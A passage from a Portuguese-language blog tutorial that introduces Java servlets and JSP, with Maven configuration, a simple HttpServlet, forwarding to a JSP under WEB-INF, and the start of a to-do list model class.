&lt;p&gt;Mas talvez a melhor definição venha (novamente) da &lt;a href="https://www.caelum.com.br/apostila-java-web/servlets/" title="Capítulo 5 - Servlets"&gt;apostila de &lt;em&gt;Java&lt;/em&gt; para &lt;em&gt;web&lt;/em&gt;&lt;/a&gt; da &lt;em&gt;Caelum&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Uma primeira ideia da servlet seria que cada uma delas é responsável por uma página, sendo que ela lê dados da requisição do cliente e responde com outros dados (uma página HTML, uma imagem GIF etc). Como no Java tentamos sempre que possível trabalhar orientado a objetos, nada mais natural que uma servlet seja representada como um objeto a partir de uma classe Java.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Neha Vaidya&lt;/em&gt; descreve de forma simples e didática o ciclo de vida de um &lt;em&gt;servlet&lt;/em&gt; em uma &lt;a href="https://www.quora.com/What-is-servlet/answer/Neha-Vaidya-24" title="What is servlet?"&gt;&lt;em&gt;thread&lt;/em&gt; do &lt;em&gt;Quora&lt;/em&gt;&lt;/a&gt;, no qual vou traduzir abaixo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Quando o servidor &lt;em&gt;web&lt;/em&gt; (ex.: &lt;em&gt;Apache Tomcat&lt;/em&gt;) inicia, o &lt;em&gt;servlet container&lt;/em&gt; "deploia" e carrega todos os &lt;em&gt;Servlets&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;O &lt;em&gt;servlet&lt;/em&gt; é inicializado chamando o método &lt;code&gt;init()&lt;/code&gt;. O método &lt;code&gt;Servlet.init()&lt;/code&gt; é chamado pelo &lt;em&gt;servlet container&lt;/em&gt; para indicar que essa &lt;em&gt;servlet instance&lt;/em&gt; foi iniciada com sucesso e está pronta para responder;&lt;/li&gt;
&lt;li&gt;O &lt;em&gt;servlet&lt;/em&gt; então chama o método &lt;code&gt;service()&lt;/code&gt; para processar uma requisição do cliente;&lt;/li&gt;
&lt;li&gt;O &lt;em&gt;servlet&lt;/em&gt; é terminado ao chamar o método &lt;code&gt;destroy()&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;Então o &lt;code&gt;destroy()&lt;/code&gt;, executado no fim do ciclo de vida do &lt;em&gt;servlet&lt;/em&gt; sinaliza o fim da &lt;em&gt;servlet instance&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-servletlife.jpg" width="405" height="438" title="Diagrama ilustrando o ciclo de vida de um servlet (javatpoint.com)" alt="Diagrama ilustrando o ciclo de vida de um servlet (javatpoint.com)"&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;init&lt;/code&gt; e &lt;code&gt;destroy&lt;/code&gt; são chamados apenas uma vez. Por fim, o &lt;em&gt;servlet&lt;/em&gt; é coletado pelo &lt;em&gt;gargabe collector&lt;/em&gt; da &lt;em&gt;JVM&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Um pouco de prática&lt;/h2&gt;
&lt;p&gt;Dentro do contexto da linguagem &lt;em&gt;Java&lt;/em&gt;, a &lt;code&gt;Servlet&lt;/code&gt; também é uma &lt;code&gt;Interface&lt;/code&gt;. No nosso escopo, falando de desenvolvimento &lt;em&gt;web&lt;/em&gt;, usaremos uma implementação mais especializada para trabalhar com o protocolo &lt;em&gt;HTTP&lt;/em&gt;, chamada &lt;code&gt;HttpServlet&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Voltando ao projeto &lt;code&gt;ola-mundo&lt;/code&gt;, criado no artigo anterior, vamos adicionar a &lt;em&gt;servlet API&lt;/em&gt; como dependência do projeto. Antes do nó &lt;code&gt;&amp;lt;build&amp;gt;&lt;/code&gt;, acrescente o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;properties&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;maven.compiler.source&amp;gt;&lt;/span&gt;11&lt;span class="nt"&gt;&amp;lt;/maven.compiler.source&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;maven.compiler.target&amp;gt;&lt;/span&gt;11&lt;span class="nt"&gt;&amp;lt;/maven.compiler.target&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/properties&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;dependencies&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;javax.servlet&lt;span class="nt"&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;javax.servlet-api&lt;span class="nt"&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;version&amp;gt;&lt;/span&gt;4.0.1&lt;span class="nt"&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;scope&amp;gt;&lt;/span&gt;provided&lt;span class="nt"&gt;&amp;lt;/scope&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/dependencies&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Altere o &lt;code&gt;maven.compiler.source&lt;/code&gt; para a versão do &lt;em&gt;Java&lt;/em&gt; que você estiver utilizando no momento.&lt;/p&gt;
&lt;p&gt;Na sequência, crie o pacote onde escreveremos a classe:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkdir -p src/main/java/webapp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez na pasta, crie o arquivo &lt;code&gt;OlaMundoServlet.java&lt;/code&gt; com o seguinte conteúdo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/OlaMundoServlet.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.IOException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.PrintWriter&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.annotation.WebServlet&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServlet&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServletRequest&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServletResponse&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@WebServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/servlet&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;OlaMundoServlet&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;HttpServlet&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;service&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;PrintWriter&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getWriter&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;

        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;body&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;h2&amp;gt;Hello World! (from servlet)&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;/body&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Execute novamente o comando &lt;code&gt;mvn clean tomcat7:run&lt;/code&gt;, e acesse o endereço &lt;code&gt;http://localhost:8080/servlet&lt;/code&gt;. Bingo!&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/java-servlet-browser-example.png" width="640" height="239" title="Exemplo utilizando Servlet" alt="Exemplo utilizando Servlet"&gt;&lt;/p&gt;
&lt;h3&gt;Mais razão, menos magia&lt;/h3&gt;
&lt;p&gt;A partir da especificação &lt;em&gt;Servlet 3&lt;/em&gt;, é possível utilizar &lt;a href="https://docs.oracle.com/javase/tutorial/java/annotations/" title="Leia mais na documentação da Oracle"&gt;&lt;em&gt;annotations&lt;/em&gt;&lt;/a&gt; para configurar o &lt;em&gt;deployment&lt;/em&gt; do &lt;em&gt;servlet&lt;/em&gt;. Com essa forma mais "programática" não é necessário alterar o arquivo &lt;code&gt;WEB-INF/web.xml&lt;/code&gt;, e o resultado final fica (na minha opinião) mais prático de ser gerenciado.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/gandalf.jpeg" width="740" height="493" title="Vemos aqui Gandalf claramente desfrutando do seu vício em Java (greenide.com)" alt="Vemos aqui Gandalf claramente desfrutando do seu vício em Java (greenide.com)"&gt;&lt;/p&gt;
&lt;p&gt;Com a anotação &lt;code&gt;@WebServlet&lt;/code&gt; mapeamos um nome e rota específicos (&lt;code&gt;/servlet&lt;/code&gt;) ao &lt;em&gt;servlet&lt;/em&gt; em questão. O &lt;em&gt;servlet container&lt;/em&gt; irá reconhecê-lo e fará a ligação entre rota e classe &lt;em&gt;Java&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Há mais vantagens (e &lt;em&gt;annotations&lt;/em&gt;) disponíveis com essa versão da especificação. Para saber mais, o "&lt;a href="https://dzone.com/articles/an-overview-servlet-30" title="Leia mais do DZone"&gt;An Overview of Servlet 3.0&lt;/a&gt;", do site &lt;em&gt;DZone&lt;/em&gt;, traz um breve resumo.&lt;/p&gt;
&lt;h2&gt;JavaServer Pages&lt;/h2&gt;
&lt;p&gt;Você deve estar se perguntando: De onde veio aquele "Hello World!", do endereço &lt;code&gt;http://localhost:8080/&lt;/code&gt;?&lt;/p&gt;
&lt;p&gt;Ele veio do arquivo &lt;code&gt;index.jsp&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat src/main/webapp/index.jsp

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;h2&amp;gt;Hello World!&amp;lt;/h2&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Segundo o &lt;em&gt;Wikipedia&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JavaServer Pages (JSP) is a collection of technologies that helps software developers create dynamically generated web pages based on HTML, XML, SOAP, or other document types. (...) JSP is similar to PHP and ASP, but it uses the Java programming language.&lt;/p&gt;
&lt;p&gt;To deploy and run JavaServer Pages, a compatible web server with a servlet container, such as Apache Tomcat or Jetty, is required.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Na prática, &lt;em&gt;JSP&lt;/em&gt; é uma abstração de &lt;em&gt;servlet&lt;/em&gt;. Os arquivos &lt;em&gt;JSP&lt;/em&gt; são traduzidos em &lt;em&gt;servlets&lt;/em&gt; durante o &lt;em&gt;runtime&lt;/em&gt;, resultando em algo similar com o que fizemos ao escrever o nosso próprio:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat target/tomcat/work/Tomcat/localhost/_/org/apache/jsp/index_jsp.java

package org.apache.jsp;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.jsp.*;

public final class index_jsp extends org.apache.jasper.runtime.HttpJspBase
    implements org.apache.jasper.runtime.JspSourceDependent {

    (...)

    public void _jspInit() {
        (...)
    }

    public void _jspDestroy() {
    }

    public void _jspService(final javax.servlet.http.HttpServletRequest request,
                            final javax.servlet.http.HttpServletResponse response)
            throws java.io.IOException, javax.servlet.ServletException {

        (...)

        out.write(&amp;quot;&amp;lt;html&amp;gt;\n&amp;quot;);
        out.write(&amp;quot;&amp;lt;body&amp;gt;\n&amp;quot;);
        out.write(&amp;quot;&amp;lt;h2&amp;gt;Hello World!&amp;lt;/h2&amp;gt;\n&amp;quot;);
        out.write(&amp;quot;&amp;lt;/body&amp;gt;\n&amp;quot;);
        out.write(&amp;quot;&amp;lt;/html&amp;gt;\n&amp;quot;);

        (...)
    }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Estamos em 2019, e já estamos cansados de saber que misturar &lt;em&gt;HTML&lt;/em&gt; com sua regra de negócios não é uma boa ideia. Uma alternativa seria alterar o &lt;em&gt;servlet&lt;/em&gt; que escrevemos e utilizar o &lt;em&gt;JSP&lt;/em&gt; como uma espécie de "template engine". Paramos de imprimir &lt;em&gt;HTML&lt;/em&gt; e deixamos a linguagem lidar com esse tipo de trabalho (~mais ou menos o que se faz usando &lt;a href="https://reactjs.org/docs/introducing-jsx.html" title="Note as aspas irônicas"&gt;&lt;em&gt;JSX&lt;/em&gt;&lt;/a&gt;~):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/OlaMundoServlet.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;java.io.IOException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.RequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.ServletException&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.annotation.WebServlet&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServlet&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServletRequest&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;javax.servlet.http.HttpServletResponse&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="nd"&gt;@WebServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/servlet&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;OlaMundoServlet&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="n"&gt;HttpServlet&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;

    &lt;span class="nd"&gt;@Override&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;service&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;HttpServletRequest&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HttpServletResponse&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="kd"&gt;throws&lt;/span&gt; &lt;span class="n"&gt;ServletException&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IOException&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;RequestDispatcher&lt;/span&gt; &lt;span class="n"&gt;rd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/index.jsp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;rd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;forward&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É isso mesmo o que você está lendo: Redirecionamos a requisição do "nosso &lt;em&gt;servlet&lt;/em&gt;" para o &lt;em&gt;JSP&lt;/em&gt; (que também é um &lt;em&gt;servlet&lt;/em&gt;). Respeitamos a especificação e conseguimos dividir as responsabilidades. Não aparenta ser bonito, mas pelo menos por hora já conseguimos separar o que é o nosso controlador do que é a nossa visualização.&lt;/p&gt;
&lt;h3&gt;Traçando nova rota&lt;/h3&gt;
&lt;p&gt;O &lt;code&gt;index.jsp&lt;/code&gt; ainda está acessível através do endereço &lt;code&gt;/&lt;/code&gt;. Para ocultá-lo do acesso público, mova-o para a pasta &lt;code&gt;WEB-INF&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mv src/main/webapp/index.jsp src/main/webapp/WEB-INF
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ao executar o &lt;em&gt;Tomcat&lt;/em&gt; novamente, ambos endereços (&lt;code&gt;/&lt;/code&gt; e &lt;code&gt;/servlet&lt;/code&gt;) devem apresentar uma resposta &lt;code&gt;404&lt;/code&gt; agora (já que o recurso público &lt;code&gt;index.jsp&lt;/code&gt; não existe mais). Na &lt;em&gt;annotation&lt;/em&gt; &lt;code&gt;@WebServlet&lt;/code&gt;, altere o &lt;em&gt;path&lt;/em&gt; para fazê-lo virar a &lt;em&gt;index&lt;/em&gt; da aplicação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@WebServlet&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urlPatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O próximo passo agora é dizer para o &lt;code&gt;RequestDispatcher&lt;/code&gt; a nova localização do &lt;code&gt;index.jsp&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;RequestDispatcher&lt;/span&gt; &lt;span class="n"&gt;rd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getRequestDispatcher&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/WEB-INF/index.jsp&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Reinicie o &lt;em&gt;Tomcat&lt;/em&gt; (&lt;code&gt;mvn clean tomcat7:run&lt;/code&gt;) e acesse o &lt;code&gt;http://localhost:8080&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Funciona!&lt;/p&gt;
&lt;h2&gt;Deixando um pouquinho mais dinâmico&lt;/h2&gt;
&lt;p&gt;Com o que temos aqui já é possível prototipar uma aplicação simples. Vamos imaginar uma lista de tarefas (&lt;em&gt;such a cliché&lt;/em&gt;!), onde eu tenho um campo para adicionar uma tarefa e uma lista com as mesmas logo abaixo. Para deixar tudo simples, vamos continuar com o projeto &lt;code&gt;ola-mundo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Altere o &lt;code&gt;index.jsp&lt;/code&gt; para o seguinte código &lt;em&gt;HTML&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;TODO list&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h2&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;label&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        Tarefa:
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;nome&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;required&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;label&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Salvar&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Tarefa&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;li&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;ul&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fica óbvio que precisaremos de um elemento que represente uma tarefa. Se formos por uma abordagem &lt;em&gt;MVC&lt;/em&gt;, faria sentido categorizar esse elemento como um modelo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ mkdir -p src/main/java/webapp/modelo
$ touch src/main/java/webapp/modelo/Tarefa.java
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A classe será muito simples:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// src/main/java/webapp/modelo/Tarefa.java&lt;/span&gt;
&lt;span class="kn"&gt;package&lt;/span&gt; &lt;span class="nn"&gt;webapp.model&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Tarefa&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;protected&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

